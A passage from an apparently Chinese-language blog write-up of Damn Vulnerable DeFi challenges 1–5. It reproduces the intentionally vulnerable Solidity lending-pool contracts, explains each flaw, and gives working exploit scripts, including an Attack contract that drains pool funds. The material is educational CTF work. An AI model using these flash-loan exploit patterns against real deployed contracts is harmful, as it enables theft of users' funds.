return 0;</span><br><span class="line"></span><br><span class="line">        return totalAssets();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @inheritdoc IERC3156FlashLender</span><br><span class="line">     */</span><br><span class="line">    function flashFee(address _token, uint256 _amount) public view returns (uint256 fee) &#123;</span><br><span class="line">        if (address(asset) != _token)</span><br><span class="line">            revert UnsupportedCurrency();</span><br><span class="line"></span><br><span class="line">        if (block.timestamp &lt; end &amp;&amp; _amount &lt; maxFlashLoan(_token)) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return _amount.mulWadUp(FEE_FACTOR);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setFeeRecipient(address _feeRecipient) external onlyOwner &#123;</span><br><span class="line">        if (_feeRecipient != address(this)) &#123;</span><br><span class="line">            feeRecipient = _feeRecipient;</span><br><span class="line">            emit FeeRecipientUpdated(_feeRecipient);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @inheritdoc ERC4626</span><br><span class="line">     */</span><br><span class="line">    function totalAssets() public view override returns (uint256) &#123;</span><br><span class="line">        assembly &#123; // better safe than sorry</span><br><span class="line">            if eq(sload(0), 2) &#123;</span><br><span class="line">                mstore(0x00, 0xed3ba6a6)</span><br><span class="line">                revert(0x1c, 0x04)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return asset.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @inheritdoc IERC3156FlashLender</span><br><span class="line">     */</span><br><span class="line">    function flashLoan(</span><br><span class="line">        IERC3156FlashBorrower receiver,</span><br><span class="line">        address _token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external returns (bool) &#123;</span><br><span class="line">        if (amount == 0) revert InvalidAmount(0); // fail early</span><br><span class="line">        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement</span><br><span class="line">        uint256 balanceBefore = totalAssets();</span><br><span class="line">        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement</span><br><span class="line">        uint256 fee = flashFee(_token, amount);</span><br><span class="line">        // transfer tokens out + execute callback on receiver</span><br><span class="line">        ERC20(_token).safeTransfer(address(receiver), amount);</span><br><span class="line">        // callback must return magic value, otherwise assume it failed</span><br><span class="line">        if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;))</span><br><span class="line">            revert CallbackFailed();</span><br><span class="line">        // pull amount + fee from receiver, then pay the fee to the recipient</span><br><span class="line">        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);</span><br><span class="line">        ERC20(_token).safeTransfer(feeRecipient, fee);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @inheritdoc ERC4626</span><br><span class="line">     */</span><br><span class="line">    function beforeWithdraw(uint256 assets, uint256 shares) internal override nonReentrant &#123;&#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @inheritdoc ERC4626</span><br><span class="line">     */</span><br><span class="line">    function afterDeposit(uint256 assets, uint256 shares) internal override nonReentrant &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题是让我们阻止接下来的贷款，所以我们只需要关注<code>UnstoppableVault</code>合约的<code>flashLoan()</code>函数即可，这里我们能看到四个阻止合约贷款的条件，去掉我们一看就知道不能控制的条件外，只剩下了<code>if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</code>这一个条件，这个条件成立的情况是该合约的所有代币的所有者都是合约本身，但如果我们像这个合约发送了一些代币后会发生什么情况，那就是合约本身的余额增加了，但是<code>totalSupply</code>没有增加，因为它只能通过<code>mint()</code>来更新，所以我们只需要像该合约发送一些代币即可</p>
<h4 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> token.<span class="title function_">transfer</span>(vault.<span class="property">address</span>, <span class="variable constant_">INITIAL_PLAYER_TOKEN_BALANCE</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Challenge-2-Naive-receiver"><a href="#Challenge-2-Naive-receiver" class="headerlink" title="Challenge #2 - Naive receiver"></a>Challenge #2 - Naive receiver</h3><p>There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.</p>
<p>A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.</p>
<p>Take all ETH out of the user’s contract. If possible, in a single transaction.</p>
<h4 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h4><h5 id="FlashLoanReceiver-sol"><a href="#FlashLoanReceiver-sol" class="headerlink" title="FlashLoanReceiver.sol"></a>FlashLoanReceiver.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line">import &quot;./NaiveReceiverLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title FlashLoanReceiver</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract FlashLoanReceiver is IERC3156FlashBorrower &#123;</span><br><span class="line"></span><br><span class="line">    address private pool;</span><br><span class="line">    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;</span><br><span class="line"></span><br><span class="line">    error UnsupportedCurrency();</span><br><span class="line"></span><br><span class="line">    constructor(address _pool) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(</span><br><span class="line">        address,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        uint256 fee,</span><br><span class="line">        bytes calldata</span><br><span class="line">    ) external returns (bytes32) &#123;</span><br><span class="line">        assembly &#123; // gas savings</span><br><span class="line">            if iszero(eq(sload(pool.slot), caller())) &#123;</span><br><span class="line">                mstore(0x00, 0x48f5c3ed)</span><br><span class="line">                revert(0x1c, 0x04)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        if (token != ETH)</span><br><span class="line">            revert UnsupportedCurrency();</span><br><span class="line">        </span><br><span class="line">        uint256 amountToBeRepaid;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            amountToBeRepaid = amount + fee;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _executeActionDuringFlashLoan();</span><br><span class="line"></span><br><span class="line">        // Return funds to pool</span><br><span class="line">        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);</span><br><span class="line"></span><br><span class="line">        return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Internal function where the funds received would be used</span><br><span class="line">    function _executeActionDuringFlashLoan() internal &#123; &#125;</span><br><span class="line"></span><br><span class="line">    // Allow deposits of ETH</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="NaiveReceiverLenderPool-sol"><a href="#NaiveReceiverLenderPool-sol" class="headerlink" title="NaiveReceiverLenderPool.sol"></a>NaiveReceiverLenderPool.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line">import &quot;./FlashLoanReceiver.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title NaiveReceiverLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender &#123;</span><br><span class="line"></span><br><span class="line">    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;</span><br><span class="line">    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan</span><br><span class="line">    bytes32 private constant CALLBACK_SUCCESS = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line">    error UnsupportedCurrency();</span><br><span class="line">    error CallbackFailed();</span><br><span class="line"></span><br><span class="line">    function maxFlashLoan(address token) external view returns (uint256) &#123;</span><br><span class="line">        if (token == ETH) &#123;</span><br><span class="line">            return address(this).balance;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashFee(address token, uint256) external pure returns (uint256) &#123;</span><br><span class="line">        if (token != ETH)</span><br><span class="line">            revert UnsupportedCurrency();</span><br><span class="line">        return FIXED_FEE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        IERC3156FlashBorrower receiver,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external returns (bool) &#123;</span><br><span class="line">        if (token != ETH)</span><br><span class="line">            revert UnsupportedCurrency();</span><br><span class="line">        </span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line"></span><br><span class="line">        // Transfer ETH and handle control to receiver</span><br><span class="line">        SafeTransferLib.safeTransferETH(address(receiver), amount);</span><br><span class="line">        if(receiver.onFlashLoan(</span><br><span class="line">            msg.sender,</span><br><span class="line">            ETH,</span><br><span class="line">            amount,</span><br><span class="line">            FIXED_FEE,</span><br><span class="line">            data</span><br><span class="line">        ) != CALLBACK_SUCCESS) &#123;</span><br><span class="line">            revert CallbackFailed();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (address(this).balance &lt; balanceBefore + FIXED_FEE)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Allow deposits of ETH</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题是让我们掏空用户合约的代币，我们可以看到每在池子借一笔闪电贷就会支付<code>1 ether</code>的代币，在用户合约中的<code>onFlashLoan()</code>的函数中检测了是否由闪电贷合约调用，但却没有检测这笔闪电贷是否由用户所借的，所以我们只需要调用<code>flashLoan()</code>并传入用户的<code>FlashLoanReceiver</code>合约地址即可</p>
<h4 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">await</span> pool.<span class="title function_">flashLoan</span>(receiver.<span class="property">address</span>,<span class="string">&quot;0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE&quot;</span>,<span class="number">1</span>,<span class="string">&quot;0x&quot;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Challenge-3-Truster"><a href="#Challenge-3-Truster" class="headerlink" title="Challenge #3 - Truster"></a>Challenge #3 - Truster</h3><p>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.</p>
<p>The pool holds 1 million DVT tokens. You have nothing.</p>
<p>To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.</p>
<h4 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h4><h5 id="TrusterLenderPool-sol"><a href="#TrusterLenderPool-sol" class="headerlink" title="TrusterLenderPool.sol"></a>TrusterLenderPool.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title TrusterLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract TrusterLenderPool is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    DamnValuableToken public immutable token;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line"></span><br><span class="line">    constructor(DamnValuableToken _token) &#123;</span><br><span class="line">        token = _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)</span><br><span class="line">        external</span><br><span class="line">        nonReentrant</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 balanceBefore = token.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        token.transfer(borrower, amount);</span><br><span class="line">        target.functionCall(data);</span><br><span class="line"></span><br><span class="line">        if (token.balanceOf(address(this)) &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题是让我们将池子中的代币掏空，我们可以看到<code>functionCall()</code>函数，这个函数是<code>Address</code>库中的一个函数，相当于一个调用合约函数的<code>call()</code>函数，我们可以构造一个<code>ERC20</code>合约的<code>approve()</code>的<code>calldata</code>，然后传入的<code>target</code>为<code>token</code>的地址，授权给我们转账的金额，最后再通过<code>transferFrom()</code>将池子中的代币掏空</p>
<h4 id="Attack-2"><a href="#Attack-2" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">selector = Web3.utils.keccak256(&quot;approve(address,uint256)&quot;).slice(0,10);</span><br><span class="line">       param = &#x27;000000000000000000000000&#x27;+player.address.slice(2,)+Web3.eth.abi.encodeParameter(&#x27;uint256&#x27;,&quot;1000000000000000000000000&quot;).slice(2,);</span><br><span class="line">       data = selector + param;</span><br><span class="line">       await pool.connect(player).flashLoan(0,player.address,token.address,data);</span><br><span class="line">       await token.connect(player).transferFrom(pool.address,player.address,TOKENS_IN_POOL);</span><br></pre></td></tr></table></figure>

<h3 id="Challenge-4-Side-Entrance"><a href="#Challenge-4-Side-Entrance" class="headerlink" title="Challenge #4 - Side Entrance"></a>Challenge #4 - Side Entrance</h3><p>A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.</p>
<p>It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</p>
<p>Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.</p>
<h4 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h4><h5 id="SideEntranceLenderPool-sol"><a href="#SideEntranceLenderPool-sol" class="headerlink" title="SideEntranceLenderPool.sol"></a>SideEntranceLenderPool.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SideEntranceLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SideEntranceLenderPool &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private balances;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line"></span><br><span class="line">    event Deposit(address indexed who, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed who, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            balances[msg.sender] += msg.value;</span><br><span class="line">        &#125;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line">        </span><br><span class="line">        delete balances[msg.sender];</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line"></span><br><span class="line">        SafeTransferLib.safeTransferETH(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line"></span><br><span class="line">        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line"></span><br><span class="line">        if (address(this).balance &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题就很简单了，我们可以调用<code>flashLoan()</code>借来池子中的所有钱，并通过<code>execute()</code>来调用题目合约的<code>deposit()</code>函数，将钱存入该池子，最后通过<code>withdraw()</code>函数取出所有钱</p>
<h4 id="Attack-3"><a href="#Attack-3" class="headerlink" title="Attack"></a>Attack</h4><h5 id="SideEntranceLenderPoolAttack-sol"><a href="#SideEntranceLenderPoolAttack-sol" class="headerlink" title="SideEntranceLenderPoolAttack.sol"></a>SideEntranceLenderPoolAttack.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;./SideEntranceLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    SideEntranceLenderPool public pool;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool)&#123;</span><br><span class="line">        pool=SideEntranceLenderPool(_pool);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable&#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 amount) external&#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external&#123;</span><br><span class="line">        pool.withdraw();</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback()external payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="js"><a href="#js" class="headerlink" title="js"></a>js</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> attack = <span class="keyword">await</span> (<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;Attack&#x27;</span>, player)).<span class="title function_">deploy</span>(pool.<span class="property">address</span>);</span><br><span class="line">        <span class="keyword">await</span> attack.<span class="title function_">connect</span>(player).<span class="title function_">attack</span>(<span class="variable constant_">ETHER_IN_POOL</span>);</span><br><span class="line">        <span class="keyword">await</span> attack.<span class="title function_">connect</span>(player).<span class="title function_">withdraw</span>();</span><br></pre></td></tr></table></figure>

<h3 id="Challenge-5-The-Rewarder"><a href="#Challenge-5-The-Rewarder" class="headerlink" title="Challenge #5 - The Rewarder"></a>Challenge #5 - The Rewarder</h3><p>There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.</p>
<p>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</p>
<p>You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</p>
<p>By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?</p>
<h4 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h4><h5 id="AccountingToken-sol"><a href="#AccountingToken-sol" class="headerlink" title="AccountingToken.sol"></a>AccountingToken.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;;</span><br><span class="line">import &quot;solady/src/auth/OwnableRoles.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title AccountingToken</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> * @notice A limited pseudo-ERC20 token to keep track of deposits and withdrawals</span><br><span class="line"> *         with snapshotting capabilities.</span><br><span class="line"> */</span><br><span class="line">contract AccountingToken is 